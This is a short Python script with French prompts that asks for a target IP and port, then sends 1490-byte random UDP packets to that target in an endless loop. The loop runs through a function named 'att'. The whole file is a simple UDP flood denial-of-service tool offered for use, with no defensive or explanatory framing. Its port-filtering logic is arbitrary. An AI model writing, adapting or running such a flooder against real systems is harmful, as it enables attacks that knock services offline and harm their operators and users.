import random
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


ip = input('Entrer une ip : ')
port = input('Entrer un port :  ')


def att(ip,port):
    if port == 80 or port == 443:
        sock.sendto(bytes, (ip, port))
        print(port)
    elif port%4==0 and port >= 1024 and port <= 65535:
        sock.sendto(bytes, (ip, port))
        print(port)
    else:
        print('Entrée saisie non valide')

while True:
    att(ip, int(port))
    


